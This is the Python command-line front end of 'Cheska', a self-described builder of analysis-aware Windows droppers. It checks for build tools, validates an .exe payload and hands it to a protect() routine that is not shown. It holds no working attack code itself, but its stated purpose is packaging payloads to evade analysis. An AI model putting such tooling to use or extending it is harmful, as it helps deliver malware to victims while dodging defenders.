# Author: Nemuel Wainaina

from colorama import init, Fore


init()

def perform_tool_checks():
    import shutil

    tools = ['x86_64-w64-mingw32-windres', 'x86_64-w64-mingw32-g++', 'strip']
    for tool in tools:
        if not shutil.which(tool):
            print(f'{Fore.RED}[!]{Fore.RESET} {tool} not found')
            print(f'[i] Cheska requires MinGW-w64 and access to the strip command :)')
            exit(1)


def parse_args():
    import argparse

    parser = argparse.ArgumentParser(description='Cheska - Smart Dropper Builder')
    parser.add_argument('-p', '--payload', required=True, help='Path to the payload (.exe file)')
    parser.add_argument('-o', '--output', help='Path to save the generated dropper')
    return parser.parse_args()


def is_payload_valid(payload_file):
    import os, pefile

    if not os.path.exists(payload_file):
        print(f'{Fore.RED}[!] {payload_file} not found. No such file!{Fore.RESET}')
        return False
    
    if not payload_file.lower().endswith('.exe'):
        return False
    try:
        pe = pefile.PE(payload_file)
        return True
    except pefile.PEFormatError:
        return False
    
def print_banner():
    from pyfiglet import figlet_format
    name = figlet_format('CHESKA').rstrip()
    desc = f'  > Builder for analysis-aware Windows droppers'
    auth = f'  > Author: Nemuel Wainaina (@nemuelw)'
    print(f'{Fore.GREEN}{name}{Fore.RESET}', end='\n\n')
    for x in (desc, auth):
        print(f'{Fore.GREEN}{x}{Fore.RESET}')
    print()


if __name__ == "__main__":
    print_banner()

    perform_tool_checks()

    args = parse_args()
    if not is_payload_valid(args.payload):
        print(f'{Fore.CYAN}[!] The payload must be a valid EXE file{Fore.RESET}')
        exit(1)

    from utils import protect
    result = ''
    if args.output:
        result = protect(args.payload, args.output)
    else:
        result = protect(args.payload)

    print(f'{Fore.GREEN}[+] Build complete: {result}{Fore.RESET}')
